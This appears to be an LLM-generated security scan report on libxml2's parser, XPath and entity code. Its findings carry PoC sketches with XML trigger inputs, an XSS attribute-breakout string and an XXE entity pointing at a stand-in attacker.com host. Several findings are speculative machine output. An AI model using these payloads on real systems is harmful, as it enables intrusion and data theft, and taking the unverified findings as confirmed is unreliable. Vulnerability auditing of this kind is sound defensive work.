# libxml2 — GLM-5.1 Pipeline A scan (2026-05-04)

- **Model**: glm-5.1
- **Segments**: 32 (0 hit GLM API timeout)
- **Total findings**: 92
  - 🔴 **CRITICAL**: 10
  - 🟠 **HIGH**: 23
  - 🟡 **MEDIUM**: 36
  - 🔵 **LOW**: 18
  - ⚪ **INFO**: 5

## Per-segment summary

| Segment | Time (s) | Findings | Status |
|---|---:|---:|---|
| `libxml2/parser.c [xmlParseCharRef: char ref decoder L2578-2750]` | 225.6 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseNameComplex: name len+colon (CVE-2022-40303)]` | 93.5 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseEntityValue A: entity literal L3870-4032]` | 184.6 | 3 | ✅ ok |
| `libxml2/parser.c [xmlParseEntityValue B: entity expansion L4032-4168]` | 203.8 | 4 | ✅ ok |
| `libxml2/parser.c [xmlExpandEntitiesInAttValue (CVE-2022-40304 area)]` | 72.9 | 3 | ✅ ok |
| `libxml2/parser.c [xmlParseAttValueInternal A: attrib decode L4303-4420]` | 321.3 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseAttValueInternal B: entity in attrib L4420-4535]` | 127.7 | 3 | ✅ ok |
| `libxml2/parser.c [xmlParseCharDataInternal: CDATA + text L4775-4910]` | 197.1 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseEntityDecl A: decl entry+type L5698-5800]` | 75.3 | 5 | ✅ ok |
| `libxml2/parser.c [xmlParseEntityDecl B: value+system L5800-5920]` | 139.9 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseStartTag2 A: ns prefix resolve L8974-9095]` | 360.4 | 0 | ✅ ok |
| `libxml2/parser.c [xmlParseStartTag2 B: attrib accumulator L9095-9215]` | 286.3 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseStartTag2 C: ns URI lookup L9215-9340]` | 266.6 | 4 | ✅ ok |
| `libxml2/parser.c [xmlParseStartTag2 D: ns expand+attrib dedup L9340-9460]` | 198.9 | 2 | ✅ ok |
| `libxml2/parser.c [xmlParseStartTag2 E: attrib flush+end L9460-9570]` | 321.4 | 3 | ✅ ok |
| `libxml2/xpath.c [xmlXPathNodeSetAdd: array growth OOB L2910-3075]` | 233.7 | 5 | ✅ ok |
| `libxml2/xpath.c [xmlXPathNodeSetMergeAndClear: merge+dedup L3115-3250]` | 167.3 | 3 | ✅ ok |
| `libxml2/xpath.c [xmlXPathEqualNodeSets: equality compare L5831-5940]` | 360.5 | 0 | ✅ ok |
| `libxml2/xpath.c [xmlXPathCompareValues: type coercion compare L6299-6415]` | 202.5 | 3 | ✅ ok |
| `libxml2/xpath.c [xmlXPathNextAncestor: ancestor axis traversal L6954-7060]` | 109.6 | 4 | ✅ ok |
| `libxml2/xpath.c [xmlXPathSubstringFunction+Before: alloc L8051-8200]` | 360.5 | 0 | ✅ ok |
| `libxml2/xpath.c [xmlXPathSubstringAfter+Normalize+Translate L8200-8336]` | 248.1 | 3 | ✅ ok |
| `libxml2/xpath.c [xmlXPathCurrentChar+ParseNameComplex A L8698-8855]` | 145.5 | 3 | ✅ ok |
| `libxml2/xpath.c [xmlXPathParseNameComplex B: qualified name L8855-8990]` | 360.5 | 0 | ✅ ok |
| `libxml2/xpath.c [xmlXPathCompPathExpr: path expression compile L9544-9665]` | 360.5 | 0 | ✅ ok |
| `libxml2/xpath.c [xmlXPathNodeSetFilter: predicate filter L10471-10595]` | 360.5 | 0 | ✅ ok |
| `libxml2/entities.c [xmlCreateEntity+xmlAddEntity: create+insert L1-155]` | 65.9 | 4 | ✅ ok |
| `libxml2/entities.c [xmlGetPredefinedEntity+GetEntityFromTable L155-286]` | 360.5 | 0 | ✅ ok |
| `libxml2/entities.c [xmlGetDocEntity+DtdEntity: lookup chain L286-430]` | 67.7 | 4 | ✅ ok |
| `libxml2/entities.c [xmlAddDtdEntity+NewEntity+GetParameter L430-562]` | 102.8 | 3 | ✅ ok |
| `libxml2/entities.c [entity content handling+value encode L562-726]` | 262.6 | 5 | ✅ ok |
| `libxml2/entities.c [entity value escaping+output+cleanup L726-908]` | 284.7 | 4 | ✅ ok |

## 🔴 CRITICAL (10)

### `libxml2/parser.c [xmlParseNameComplex: name len+colon (CVE-2022-40303)]` — L36 — conf=0.95
**Integer overflow in name length tracking allows OOB read via xmlDictLookup (CVE-2022-40303)**

The `len` variable is declared as `int` (signed 32-bit). Two issues lead to an exploitable integer overflow: (1) The initial `len += l` on lines 36 and 71 has NO overflow check at all. (2) Inside the while loops (lines 60-61 and 81-82), when the check `len <= INT_MAX - l` fails, `len` is simply not incremented but parsing CONTINUES via NEXTL(l). This means `len` diverges from the actual number of bytes consumed — it becomes smaller than reality. The subsequent `len > maxLength` check (line 87) is then bypassed since `len` is incorrectly small. Finally, the incorrect `len` is used in pointer ar…

*PoC sketch:* Craft an XML document with a name exceeding INT_MAX (~2.14 billion) bytes using valid multi-byte UTF-8 name characters (e.g., characters in the 0x10000-0xEFFFF range, each consuming 4 bytes in UTF-8, requiring ~537 million such characters). The `len` accumulator will overflow past INT_MAX, wrap to a…

### `libxml2/parser.c [xmlExpandEntitiesInAttValue (CVE-2022-40304 area)]` — L12 — conf=0.95
**Entity content corruption on parse error (CVE-2022-40304)**

When xmlParseStringCharRef() or xmlParseStringEntityRef() fails during entity expansion in an attribute value, the code corrupts the parent entity's content by setting pent->content[0] = 0. This truncates the entity's content to an empty string, which persists beyond the current expansion context. If the same entity is referenced again or during hash table cleanup, the corrupted content (now an empty string) can cause a hash key mismatch. The entity may be stored in one hash bucket under its original key but looked up or deleted under the corrupted (empty) key, leading to hash table inconsiste…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY x "&#x0;"> ]> <doc a="&x;" b="&x;"/>  The null character reference &#x0; causes xmlParseStringCharRef to return 0, triggering pent->content[0] = 0 which corrupts entity x's content. Subsequent references to &x; or hash table cleanup then operate on th…

### `libxml2/parser.c [xmlParseNameComplex: name len+colon (CVE-2022-40303)]` — L102 — conf=0.9
**Integer overflow in `len + 1` expression for CRLF adjustment**

On line 102, the expression `ctxt->input->cur - (len + 1)` is used when a CRLF line ending is detected. If `len` is close to INT_MAX, the expression `len + 1` overflows (signed integer overflow is undefined behavior in C, but typically wraps to INT_MIN = -2147483648). The pointer arithmetic `ctxt->input->cur - (INT_MIN)` effectively becomes `ctxt->input->cur + 2147483648`, pointing far beyond any valid buffer. This is passed directly to xmlDictLookup, causing a massive out-of-bounds read. This is a direct consequence of `len` being `int` rather than `size_t`.

*PoC sketch:* An XML document where a name of length INT_MAX-1 bytes is followed by \r\n. The `len` value reaches INT_MAX-1, then `len + 1` = INT_MAX, and if len reaches INT_MAX, `len + 1` overflows to INT_MIN. The resulting pointer passed to xmlDictLookup will be far out of bounds, causing a crash or information…

### `libxml2/parser.c [xmlExpandEntitiesInAttValue (CVE-2022-40304 area)]` — L38 — conf=0.9
**Entity content corruption on entity reference parse error**

Same vulnerability as above but triggered via xmlParseStringEntityRef() returning NULL. When an entity reference within an entity's content fails to parse (e.g., references an undefined entity), pent->content[0] = 0 is set, corrupting the parent entity's content. This has the same hash table corruption and double-free implications as the character reference path.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY x "&undefined;"> ]> <doc a="&x;"/>  The undefined entity reference inside entity x causes xmlParseStringEntityRef to return NULL, triggering pent->content[0] = 0 corruption of entity x's content.

### `libxml2/xpath.c [xmlXPathNodeSetAdd: array growth OOB L2910-3075]` — L2925 — conf=0.85
**Integer Overflow in NodeSet Array Growth Size Calculation**

The expression `cur->nodeMax * 2 * sizeof(xmlNodePtr)` passed to xmlRealloc can overflow. On 32-bit systems, `cur->nodeMax * 2` is computed as a signed int multiplication which can overflow, and the subsequent multiplication by `sizeof(xmlNodePtr)` (4 on 32-bit) can overflow `size_t`, wrapping to a small value. This causes xmlRealloc to allocate a drastically undersized buffer. However, `cur->nodeMax *= 2` is then updated to the doubled (overflowed) value, allowing subsequent writes via `cur->nodeTab[cur->nodeNr++] = val` to write far past the allocated heap buffer. The guard `if (cur->nodeMax…

*PoC sketch:* On a 32-bit system, if cur->nodeMax reaches 0x20000001 (~537M entries, requiring ~2GB for the pointer array), then cur->nodeMax * 2 = 0x40000002 (valid int), but 0x40000002 * sizeof(xmlNodePtr) = 0x40000002 * 4 = 0x100000008, which wraps 32-bit size_t to 0x8. xmlRealloc allocates only 8 bytes (2 poi…

### `libxml2/xpath.c [xmlXPathNodeSetAdd: array growth OOB L2910-3075]` — L2968 — conf=0.85
**Same Integer Overflow in xmlXPathNodeSetAddUnique Growth**

Identical integer overflow vulnerability in xmlXPathNodeSetAddUnique. The expression `cur->nodeMax * 2 * sizeof(xmlNodePtr)` can overflow on 32-bit platforms, causing an undersized heap allocation while cur->nodeMax is doubled to a large value, enabling out-of-bounds heap writes. This function skips the duplicate check, making it potentially faster to grow the node set to dangerous sizes.

*PoC sketch:* Same as the primary finding. Craft an XPath evaluation that produces a node set large enough to trigger the integer overflow in the growth calculation. The absence of duplicate checking in AddUnique means fewer comparisons per insertion, potentially allowing faster growth toward the overflow thresho…

### `libxml2/xpath.c [xmlXPathNodeSetMergeAndClear: merge+dedup L3115-3250]` — L3126 — conf=0.85
**Use-After-Free in namespace node deduplication during merge**

When a namespace node in set2 is found to be a duplicate of one in set1's initial nodes, xmlXPathNodeSetFreeNs() is called to free n2 (line ~3137). However, the deduplication check only compares against the initial nodes of set1 (initNbSet1), not against nodes already added from set2. If set2 contains the same namespace node pointer at multiple indices, the first matching occurrence frees the node, and subsequent occurrences dereference the freed pointer when accessing n2->type (line ~3132) and when comparing namespace fields. This results in a use-after-free that can be triggered via crafted …

*PoC sketch:* Craft an XML document with namespace declarations and an XPath expression that causes the same namespace node pointer to appear multiple times in a node set (e.g., via union operations like '//namespace::* | //namespace::*' or through predicate-based filtering that re-adds the same namespace node). …

### `libxml2/entities.c [xmlAddDtdEntity+NewEntity+GetParameter L430-562]` — L525 — conf=0.85
**Use-After-Free in growBufferReentrant macro - dangling `out` pointer after xmlRealloc**

The `growBufferReentrant()` macro calls `xmlRealloc()` on `buffer` and updates `buffer` to the new pointer, but does NOT update the `out` pointer which was initialized as `out = buffer;` (line ~558). When `xmlRealloc` cannot grow the buffer in-place and returns a new pointer, the old memory is freed, leaving `out` as a dangling pointer to freed memory. Subsequent writes through `out` in the encoding loop constitute a use-after-free, leading to heap corruption, potential arbitrary code execution, or information disclosure. The macro is designed to be called inline within the encoding loop of `x…

*PoC sketch:* Craft an XML document with entity content that, when encoded by xmlEncodeEntitiesInternal, exceeds the initial 1000-byte buffer size. For example, a document containing a long string of characters that require entity encoding (e.g., many '<', '&', or non-ASCII characters) will force buffer growth. W…

### `libxml2/xpath.c [xmlXPathNodeSetAdd: array growth OOB L2910-3075]` — L3045 — conf=0.8
**Same Integer Overflow in xmlXPathNodeSetMerge Growth**

Identical integer overflow vulnerability in xmlXPathNodeSetMerge. The growth code uses the same pattern `val1->nodeMax * 2 * sizeof(xmlNodePtr)` which can overflow. Additionally, the duplicate check in merge only checks against initNr (the initial node count), not against nodes added during the merge itself, meaning duplicates from val2 can inflate the set size beyond expected bounds, potentially accelerating growth toward the overflow threshold.

*PoC sketch:* Merge two large node sets where val2 contains many non-duplicate entries relative to val1's initial contents. The incomplete duplicate checking allows more nodes to be added than expected, and the integer overflow in the growth calculation can lead to heap buffer overflow.

### `libxml2/entities.c [entity content handling+value encode L562-726]` — L564 — conf=0.7
**Potential integer overflow in growBufferReentrant() leading to heap buffer overflow**

The growBufferReentrant() macro is invoked when the output buffer nears capacity. If the macro implementation doubles buffer_size (e.g., `buffer_size *= 2`) without checking for integer overflow, a very large buffer_size value could wrap around to a small value on 32-bit systems. The subsequent xmlRealloc would allocate a tiny buffer, but the code continues writing based on the old logical buffer size, resulting in a heap buffer overflow. This is a known vulnerability pattern in libxml2 (related to CVE-2022-23308 and similar). The overflow is triggerable by crafting input that forces repeated …

*PoC sketch:* On a 32-bit system, craft an input string of ~2GB that forces buffer_size to approach 0x80000000. The next growBufferReentrant() call would compute buffer_size*2 = 0x100000000, which truncates to 0 on 32-bit, causing a zero-size or minimal allocation followed by massive heap overflow.


## 🟠 HIGH (23)

### `libxml2/parser.c [xmlParseCharRef: char ref decoder L2578-2750]` — L2680 — conf=0.95
**Incorrect variable reference (CUR vs cur) in xmlParseStringCharRef hex parsing**

In xmlParseStringCharRef, when parsing uppercase hex digits (A-F) from a string, the code uses the macro CUR (which reads from the main parser input buffer via *ctxt->input->cur) instead of the local variable cur (which reads from the string being parsed). The condition correctly checks `cur`, but the value computation uses `CUR`: `val = val * 16 + (CUR - 'A') + 10;`. This causes the computed character reference value to be derived from an unrelated memory location (the main input buffer cursor position) rather than the actual hex digit in the string. This can produce incorrect but potentially…

*PoC sketch:* Craft an XML document where xmlParseStringCharRef is invoked (e.g., via attribute value parsing) with a character reference containing uppercase hex digits like &#xAF;. If the main input buffer cursor (CUR) points to a character like 'a' (0x61), then CUR - 'A' + 10 = 97 - 65 + 10 = 42, producing cha…

### `libxml2/parser.c [xmlParseNameComplex: name len+colon (CVE-2022-40303)]` — L60 — conf=0.95
**Overflow check failure does not halt parsing, allowing len to diverge from actual bytes consumed**

When the overflow check `if (len <= INT_MAX - l)` on line 60 (or 81) fails, `len` is not incremented, but the loop continues — NEXTL(l) advances the input cursor and CUR_CHAR(l) reads the next character. This means the parser keeps consuming input bytes without tracking them in `len`. The longer parsing continues past this point, the more `len` diverges from the true byte count. This makes the subsequent safety check `len > maxLength` completely ineffective and the pointer arithmetic wildly incorrect. The correct fix would be to break out of the loop or return an error when the overflow check …

*PoC sketch:* Same as the primary CVE-2022-40303 trigger: a very long name that causes the overflow check to fail partway through parsing, after which len stays frozen while the cursor advances millions of bytes further.

### `libxml2/entities.c [entity content handling+value encode L562-726]` — L567 — conf=0.95
**Missing double-quote encoding in attribute value encoding function**

The comment at line ~570 explicitly states 'By default one have to encode at least '<', '>', '"' and '&'', yet the double-quote character ('"', 0x22) is never encoded. It falls through to the 'default case, just copy' branch (line ~625: `((*cur >= 0x20) && (*cur < 0x80))`) and is output verbatim. The `xmlEncodeAttributeEntities` function, specifically designed for attribute value encoding, passes `attr=1` but this flag is only used for HTML SSI/&{} handling — never to enable `"` encoding. An attacker can inject a double-quote to break out of a double-quoted attribute context, enabling attribut…

*PoC sketch:* Input: foo" onclick="alert(1) Output: foo" onclick="alert(1) When placed in <div title="[output]">, becomes: <div title="foo" onclick="alert(1)"> — XSS triggered

### `libxml2/parser.c [xmlParseCharDataInternal: CDATA + text L4775-4910]` — L4777 — conf=0.92
**Integer overflow in nbchar leading to heap buffer over-read via SAX callbacks**

The variable `nbchar` is declared as `int` (32-bit), but is assigned the result of pointer subtraction `in - ctxt->input->cur` which yields a `ptrdiff_t` (64-bit on 64-bit systems). If the input buffer contains more than INT_MAX (~2.1GB) bytes of continuous character data between parse-breaking characters (<, &, etc.), the assignment truncates the value, causing `nbchar` to wrap to a negative number. This negative `nbchar` is then passed to SAX callbacks like `ctxt->sax->characters()` and `ctxt->sax->ignorableWhitespace()`, as well as `areBlanks()`. If a callback interprets the negative length…

*PoC sketch:* Craft an XML document with >2GB of continuous character data (e.g., a single element containing >2GB of 'A' characters without any '<', '&', or other breaking characters). The accelerated parsing path will scan the entire buffer, compute nbchar = in - ctxt->input->cur which overflows int, and pass t…

### `libxml2/parser.c [xmlParseEntityDecl A: decl entry+type L5698-5800]` — L5734 — conf=0.9
**Missing return after fatal error: space required after entity name**

After parsing the entity name, if no whitespace follows, a fatal error is reported but execution continues. This is particularly dangerous because the subsequent code checks RAW for '"' or '\'' to determine whether to parse an entity value or external ID. Without the required space, the parser may misidentify the next token, causing xmlParseEntityValue() or xmlParseExternalID() to operate on incorrectly positioned input. This can result in buffer over-reads, heap corruption, or registration of malformed entities.

*PoC sketch:* <!DOCTYPE foo [<!ENTITY name"value">]>  -- No space between name and value delimiter, parser continues and may misparse entity value

### `libxml2/parser.c [xmlParseEntityValue A: entity literal L3870-4032]` — L3897 — conf=0.85
**Integer Overflow in Entity Value Length Tracking**

The `length` variable in `xmlParseEntityValue` is declared as `int` (32-bit signed), but is incremented without overflow checking in the parsing loop (`length += 1`). If an entity value contains more than INT_MAX (2,147,483,647) bytes, `length` wraps to a negative value. This corrupted length is then used in: (1) `start = CUR_PTR - length` — producing an out-of-bounds pointer past CUR_PTR; (2) `xmlStrndup(start, length)` — passing a negative length; (3) `xmlExpandPEsInEntityValue(ctxt, &buf, start, length, ctxt->inputNr)` — passing both an invalid pointer and negative length. While `xmlStrndup…

*PoC sketch:* Craft an XML document with XML_PARSE_HUGE enabled containing an entity declaration with a value exceeding 2^31 bytes between quotes: <!ENTITY foo "AAAAAA...(>2GB of A's)..."><!DOCTYPE doc [<!ENTITY foo "AAAA...">]><doc>&foo;</doc>. With streaming input, feed >2GB of data as the entity literal value.…

### `libxml2/parser.c [xmlParseEntityValue B: entity expansion L4032-4168]` — L4078 — conf=0.85
**Broken circular entity reference detection in xmlExpandEntityInAttValue**

The function xmlExpandEntityInAttValue checks `pent->flags & XML_ENT_EXPANDING` to detect circular entity references, but it never sets the XML_ENT_EXPANDING flag on `pent` before recursive expansion. The flag is only set/unset in xmlParseEntityValue (lines 4049-4051), which is a separate function called at a different phase. This means the circular reference check in xmlExpandEntityInAttValue is effectively dead code — it will never trigger because the flag is never set during the expansion phase. An attacker can craft XML with circular entity references in attribute values, and the only prot…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY a "&b;&b;">   <!ENTITY b "&a;"> ]> <doc attr="&a;"/> <!-- Circular A->B->A reference in attribute value.      The XML_ENT_EXPANDING check in xmlExpandEntityInAttValue      will NOT detect this because the flag is never set there.      Only the depth l…

### `libxml2/parser.c [xmlParseAttValueInternal B: entity in attrib L4420-4535]` — L4488 — conf=0.85
**Entity Content Corruption via Null Byte Injection on Size Check Failure**

When xmlParserEntityCheck() detects that an entity's expandedSize exceeds the limit, the code mutates the shared entity object by setting ent->content[0] = 0 (null-terminating the content at offset 0). This permanently corrupts the entity's content for ALL subsequent references in the entire document, not just the current attribute. This global side-effect means that a later reference to the same entity will resolve to an empty string instead of its original content. This can be exploited to bypass content-based security validations (where the entity is validated on first use but consumed on s…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY xxe "SENSITIVE_DATA">   <!ENTITY huge "&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;">   <!ENTITY huge2 "&huge;&huge;&huge;&huge;&huge;&huge;&huge…

### `libxml2/parser.c [xmlParseEntityDecl A: decl entry+type L5698-5800]` — L5711 — conf=0.85
**Missing return after fatal error: space required after '<!ENTITY'**

When SKIP_BLANKS_PE returns 0 after '<!ENTITY', xmlFatalErrMsg is called to report a fatal error, but execution continues instead of returning. This allows the parser to proceed in an inconsistent state where the input cursor has not advanced past required whitespace. Subsequent parsing (checking for '%', parsing name, parsing entity value) operates on unexpected input positions, which can lead to misinterpretation of the data stream, buffer over-reads, or other memory safety issues. This is a well-known vulnerability pattern in libxml2 that has been associated with CVE-2022-23308 and similar …

*PoC sketch:* <!DOCTYPE foo [<!ENTITY%name "value">]>  -- No space between ENTITY and %, parser continues in corrupted state after fatal error

### `libxml2/parser.c [xmlParseEntityDecl A: decl entry+type L5698-5800]` — L5718 — conf=0.85
**Missing return after fatal error: space required after '%%'**

After parsing the '%' character for a parameter entity, if no whitespace follows, xmlFatalErrMsg reports a fatal error but the function does not return. The parser continues with isParameter=1 but the input cursor is at an unexpected position. xmlParseName() is then called on potentially malformed input, which can cause the parser to construct an entity declaration from incorrectly parsed data, leading to inconsistent internal state and potential memory corruption.

*PoC sketch:* <!DOCTYPE foo [<!ENTITY %name "value">]>  -- No space between % and entity name, parser continues after fatal error

### `libxml2/parser.c [xmlParseEntityDecl B: value+system L5800-5920]` — L5847 — conf=0.85
**Entity Registration Bypass via Expat Compatibility Path After Fatal Error**

When a fatal error occurs (e.g., URI contains a fragment '#'), xmlFatalErr sets ctxt->disableSAX, which prevents the SAX entityDecl callback from being invoked (line 5835 checks !ctxt->disableSAX). However, the expat compatibility path (lines 5847-5865) calls xmlSAX2EntityDecl() directly without checking disableSAX. This means entities with invalid/fragment URIs are still registered in the document's internal subset, bypassing the security validation. An attacker can declare external entities with fragment URIs that pass through to entity resolution, enabling XXE attacks or SSRF despite the fr…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE foo [   <!ENTITY xxe SYSTEM "http://attacker.com/steal#fragment"> ]> <foo>&xxe;</foo> -- With replaceEntities=1 and SAX_COMPAT_MODE, the entity 'xxe' is registered via xmlSAX2EntityDecl despite xmlFatalErr being called for the fragment, allowing the external resource …

### `libxml2/xpath.c [xmlXPathSubstringAfter+Normalize+Translate L8200-8336]` — L8248 — conf=0.85
**NULL pointer dereference via normalize-space() with missing context node**

When xmlXPathNormalizeFunction is called with nargs==0 and xmlXPathCastNodeToString returns NULL (due to a NULL context node or OOM), the code reports the error via xmlXPathPErrMemory but continues execution. It calls xmlXPathCacheWrapString(ctxt, NULL) which creates an XPath object with stringval=NULL and pushes it onto the stack. Although the function returns early when it detects source==NULL at line 8262, the corrupted value with NULL stringval remains on the evaluation stack. Subsequent XPath operations consuming this value may dereference the NULL stringval pointer, causing a crash (deni…

*PoC sketch:* Evaluate XPath expression 'normalize-space()' in a context where the context node is NULL (e.g., an XPath evaluation context initialized without a node). The resulting value on the stack will have stringval=NULL. Any subsequent operation that accesses this value's stringval (e.g., comparison, concat…

### `libxml2/xpath.c [xmlXPathCurrentChar+ParseNameComplex A L8698-8855]` — L8715 — conf=0.85
**Buffer Over-Read in xmlXPathCurrentChar UTF-8 Multi-Byte Decoding**

The xmlXPathCurrentChar function reads cur[1], cur[2], and cur[3] when decoding multi-byte UTF-8 sequences without verifying that those bytes exist within the buffer bounds. If ctxt->cur points to an incomplete multi-byte UTF-8 sequence at the end of a buffer (e.g., a string not null-terminated or a truncated buffer), the function reads past the allocated memory. While null-terminated strings provide some implicit protection (the null byte fails the continuation byte check), non-null-terminated buffers or buffers ending at page boundaries can lead to out-of-bounds reads, causing information di…

*PoC sketch:* Craft an XPath expression that ends with an incomplete multi-byte UTF-8 sequence. For example, a string ending with byte 0xE0 (start of 3-byte sequence) followed by a valid continuation byte 0x80 but no third byte, or a buffer ending with 0xF0 0x80 0x80 without the fourth byte. If the buffer is not …

### `libxml2/parser.c [xmlParseNameComplex: name len+colon (CVE-2022-40303)]` — L36 — conf=0.8
**Missing overflow check on initial len increment before while loop**

The first `len += l` on line 36 (and the equivalent on line 71 in the else branch) has no overflow guard, unlike the increments inside the while loops which at least have `if (len <= INT_MAX - l)`. While a single character's byte length `l` is typically 1-4, this is still a correctness bug that contributes to the overall integer overflow vulnerability. If `len` were somehow already near INT_MAX from a prior code path or if the function were called in an unexpected state, this unchecked increment could push `len` past INT_MAX.

*PoC sketch:* This is a contributing factor to the overall CVE-2022-40303 exploit. A name starting with a multi-byte character where the accumulated length from prior processing is near INT_MAX would overflow at this unchecked increment.

### `libxml2/xpath.c [xmlXPathNodeSetMergeAndClear: merge+dedup L3115-3250]` — L3118 — conf=0.8
**Incomplete deduplication allows duplicate node pointers leading to double-free**

The deduplication logic in xmlXPathNodeSetMergeAndClear only checks new nodes against the initial contents of set1 (initNbSet1), not against nodes already added from set2 during the current merge operation. This means if set2 contains internal duplicates (the same node pointer at multiple indices), all occurrences will be added to set1. When the merged set is later destroyed via xmlXPathFreeNodeSet, namespace nodes appearing multiple times will be freed multiple times via xmlXPathNodeSetFreeNs, resulting in a double-free vulnerability.

*PoC sketch:* Construct an XPath evaluation path that produces a node set containing the same namespace node pointer twice (e.g., through xmlXPathNodeSetAddUnique calls that skip duplicate checking). Merge this set with an empty or non-overlapping set1 using xmlXPathNodeSetMergeAndClear. Both copies of the namesp…

### `libxml2/parser.c [xmlParseStartTag2 C: ns URI lookup L9215-9340]` — L9297 — conf=0.75
**Integer overflow in maxAtts calculation leading to heap buffer overflow or infinite loop**

The calculation `maxAtts = nratts + nbTotalDef` can overflow if the sum of explicitly parsed attributes (nratts) and default attributes from DTD (nbTotalDef) exceeds INT_MAX. When maxAtts overflows to a negative value, the cast `(unsigned) maxAtts` in the hash size calculation becomes extremely large, causing the `attrHashSize` doubling loop to either: (1) run infinitely when attrHashSize wraps to 0 (DoS), or (2) produce an undersized hash table if the overflow results in a small positive maxAtts, leading to heap buffer overflow during subsequent hash table operations. Additionally, if maxAtts…

*PoC sketch:* Craft an XML document with a DTD defining a very large number of default attributes for an element, combined with many explicit attributes on that element, such that nratts + nbTotalDef overflows a 32-bit integer. For example, using parameter entity expansion in the DTD to generate millions of defau…

### `libxml2/entities.c [entity value escaping+output+cleanup L726-908]` — L753 — conf=0.75
**Integer overflow in buffer_size leading to heap buffer overflow in xmlEncodeSpecialChars**

The growBufferReentrant() macro doubles buffer_size without checking for integer overflow. On 32-bit systems where size_t is 32 bits, if buffer_size is large enough (>= 2^31), doubling it causes a wrap-around to a small value. The subsequent xmlRealloc() call with the wrapped small size can succeed, allocating a tiny buffer. The code then sets out = &buffer[indx] where indx is based on the old large buffer, pointing far past the new allocation. Subsequent writes via *out++ cause a heap buffer overflow, enabling potential code execution.

*PoC sketch:* On a 32-bit system, provide an input string of ~357MB consisting entirely of '"' characters (each expands to 6 bytes as &quot;). This forces buffer_size to grow through repeated doubling until it reaches ~0x80000000. The next doubling wraps buffer_size to a small value. If xmlRealloc succeeds with t…

### `libxml2/parser.c [xmlExpandEntitiesInAttValue (CVE-2022-40304 area)]` — L55 — conf=0.7
**Unbounded recursive entity expansion (missing depth decrement)**

The recursive call to xmlExpandEntityInAttValue passes the 'depth' parameter unchanged. The initial depth is set to ctxt->inputNr in xmlExpandEntitiesInAttValue, but since this recursive expansion operates on raw content strings rather than pushing/popping the input stack, ctxt->inputNr does not increase with recursion depth. This means the depth parameter provides no effective limit on recursion. An attacker can craft deeply nested entity definitions (e.g., entity A references B, B references C, etc.) to cause deep recursion and stack overflow, leading to denial of service.

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE doc [   <!ENTITY e1 "text">   <!ENTITY e2 "&e1;&e1;">   <!ENTITY e3 "&e2;&e2;">   <!ENTITY e4 "&e3;&e3;">   ... (continue nesting deeply) ]> <doc a="&e100;"/>  Deep nesting of entity references in attribute values causes deep recursion in xmlExpandEntityInAttValue wit…

### `libxml2/parser.c [xmlParseAttValueInternal A: attrib decode L4303-4420]` — L4327 — conf=0.7
**Integer overflow in chunkSize leading to buffer over-read**

The `chunkSize` variable is declared as `int` and accumulates the byte count of consecutive non-special characters without overflow checking. It is incremented via `chunkSize += l` (for UTF-8 multibyte, line 4349) and `chunkSize += 1` (for ASCII, line 4358, and space, line 4382). When chunkSize overflows past INT_MAX, it becomes negative. The flush operation `xmlSBufAddString(&buf, CUR_PTR - chunkSize, chunkSize)` then computes an incorrect source pointer (`CUR_PTR - negative = CUR_PTR + |chunkSize|`, pointing past the current position) and passes a negative length which, when implicitly cast …

*PoC sketch:* Craft an XML document with an attribute value containing >2,147,483,647 consecutive ASCII characters (no entities, no whitespace, no multibyte UTF-8) between the opening and closing quotes, with XML_PARSE_HUGE enabled. For example: <a attr="AAAAAA...(~2.15GB of A's)..."/>. The chunkSize will overflo…

### `libxml2/parser.c [xmlParseStartTag2 C: ns URI lookup L9215-9340]` — L9309 — conf=0.7
**Heap buffer overflow via attrHashSize multiplication overflow in xmlRealloc**

When attrHashSize is very large (e.g., due to the integer overflow in maxAtts described above), the multiplication `attrHashSize * sizeof(tmp[0])` in the xmlRealloc call can overflow on 32-bit systems. This causes xmlRealloc to allocate a much smaller buffer than expected. The subsequent memset call uses the same overflowed size, so it writes fewer bytes than needed, leaving portions of the hash table uninitialized. When the hash table is later accessed using indices computed modulo the original (large) attrHashSize, out-of-bounds heap reads and writes occur, potentially leading to arbitrary c…

*PoC sketch:* On a 32-bit system, if attrHashSize = 0x40000001 and sizeof(xmlAttrHashBucket) = 8, then attrHashSize * 8 = 0x200000008 which truncates to 0x8, causing xmlRealloc to allocate only 8 bytes. The memset writes 8 bytes, but subsequent hash table accesses use indices up to attrHashSize-1, causing heap co…

### `libxml2/parser.c [xmlParseStartTag2 E: attrib flush+end L9460-9570]` — L9518 — conf=0.7
**Out-of-bounds read on ctxt->nsTab via unchecked nsIndex**

The nsIndex value, decoded from atts[i+2] via a ptrdiff_t cast, is only checked against two sentinel values (INT_MAX and INT_MAX-1) before being used to index ctxt->nsTab[nsIndex * 2 + 1]. There is no bounds check against the actual size of the nsTab array. If nsIndex is any value other than the two sentinels but is not a valid index (e.g., a corrupted, negative, or out-of-range value from defaulted DTD attributes with undeclared namespace prefixes), this results in an out-of-bounds read. On 32-bit systems, nsIndex * 2 can also integer-overflow if nsIndex is large, producing a negative index. …

*PoC sketch:* Craft an XML document with an external DTD that defines a defaulted attribute with a namespace prefix not declared in the document instance. If the nsIndex for that defaulted attribute is set to a value other than INT_MAX/INT_MAX-1 but outside nsTab bounds, the reconstruction loop at line 9524 will …

### `libxml2/xpath.c [xmlXPathNextAncestor: ancestor axis traversal L6954-7060]` — L6988 — conf=0.7
**Type confusion in namespace node ancestor traversal**

